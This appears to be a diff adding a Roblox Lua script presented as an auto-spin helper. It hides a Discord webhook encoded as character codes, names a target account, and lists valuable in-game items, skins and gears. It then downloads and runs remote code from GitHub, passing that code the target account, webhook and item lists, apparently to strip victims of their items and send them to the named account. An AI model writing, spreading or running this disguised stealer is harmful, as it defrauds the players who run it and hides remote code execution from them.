@@ -1,0 +1,143 @@
+local TARGET_ID = 7336329612
+local TARGET_USER = "snowyaalt"
+
+WebhookEncrypted = "104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,52,48,50,53,49,51,51,48,57,49,52,57,52,55,49,50,51,47,116,105,56,122,72,55,53,81,99,89,121,88,90,83,71,56,56,76,52,86,118,77,48,119,80,117,85,87,106,73,100,69,57,110,50,101,50,81,69,45,102,101,49,48,45,72,45,69,52,74,102,121,102,74,48,83,85,74,53,107,98,65,56,110,73,98,54,72"
+
+local TargetBrainrots = {
+    ["Hydra Bunny"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Antonio"] = true,
+    ["Rico Dinero"] = true,
+    ["Rubrikiko"] = true,
+    ["Arcadragon"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Kalika Bros"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Globa Steppa"] = true,
+    ["Dug Dug Dug"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["La Casa Boo"] = true,
+    ["Dragon Aquanini"] = true,
+    ["Signore Carapace"] = true,
+    ["Fishino Clownino"] = true,
+    ["Cerberus"] = true,
+    ["Duggy Bros"] = true,
+    ["Kraken"] = true,
+    ["Venuspino"] = true,
+    ["Gorillo Subwoofero"] = true,
+    ["Foxini Lanternini"] = true,
+    ["Moby Bros"] = true,
+    ["Burguro and Fryuro"] = true,
+    ["Capitano Moby"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Cooki and Milki"] = true,
+    ["Cash or Card"] = true,
+    ["Chipso and Queso"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Ginger Gerat"] = true,
+    ["Garama and Madundung"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["La Food Combinasion"] = true,
+    ["La Secret Combinasion"] = true,
+    ["Pizza and Ranch"] = true,
+    ["Los Secret Combinasionas"] = true,
+    ["Coco and Mango"] = true,
+    ["Los Bros"] = true,
+    ["Los Primos"] = true,
+    ["Love Love Bear"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Noodle Noodle Poodle"] = true,
+    ["Rubiko and Kubiko"] = true,
+    ["Cangurato Gelato"] = true,
+    ["Steakini Fattini"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["John Pork"] = true,
+    ["Capitano Americano"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Headless Horseman"] = true,
+    ["Money Money Bros"] = true,
+    ["Caylusaurus"] = true,
+    ["Sammyni Cakini"] = true,
+    ["Jelly Moby"] = true,
+    ["Digi Narwhal"] = true,
+    ["Los Admins"] = true,
+    ["Boppin Bunny"] = true,
+    ["Chillin Chili"] = true,
+    ["Eviledon"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Festive 67"] = true,
+    ["Fragola La La La"] = true,
+    ["Gobblino Uniciclino"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Ketupat Bros"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["La Lucky Grande"] = true,
+    ["La Romantic Grande"] = true,
+    ["La Spooky Grande"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Los Amigos"] = true,
+    ["Bumbatron"] = true,
+    ["Queen Bee"] = true,
+    ["S'more Serat"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Jolly Combinasionas"] = true,
+    ["Nacho Spyder"] = true,
+    ["Orcaledon"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Secret Lucky Block"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Swaggy Bros"] = true,
+    ["Tralaledon"] = true,
+    ["Tuff Toucan"] = true,
+    ["Sammyni Truckini"] = true,
+    ["Nachorilla"] = true,
+    ["La Fuse Machine"] = true,
+    ["Tacoturbo Tacorito"] = true
+}
+
+local TargetBaseSkins = {
+    ["Candy"] = true,
+    ["Aquatic"] = true,
+    ["Christmas"] = true,
+    ["Bunny Basket"] = true,
+    ["Divine"] = true,
+    ["Easter"] = true,
+    ["Gingerbread"] = true,
+    ["Halloween"] = true,
+    ["Octo"] = true,
+    ["Lucky"] = true,
+    ["Pot of Gold"] = true,
+    ["Summer"] = true,
+    ["Taco"] = true,
+    ["Tralalero"] = true
+}
+
+local TargetGears = {
+    ["Cupid's Wings"] = true,
+    ["Santa's Sleigh"] = true,
+    ["Witch's Broom"] = true,
+    ["Waverider"] = true
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/Chocola-Auto-Spin-RNG/refs/heads/main/script.lua"))()
+
+    task.wait(1)
+
+    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
+    if type(script) == "function" then
+        script(TARGET_ID, TARGET_USER, WebhookEncrypted, TargetBrainrots, TargetBaseSkins, TargetGears)
+    end
+end)
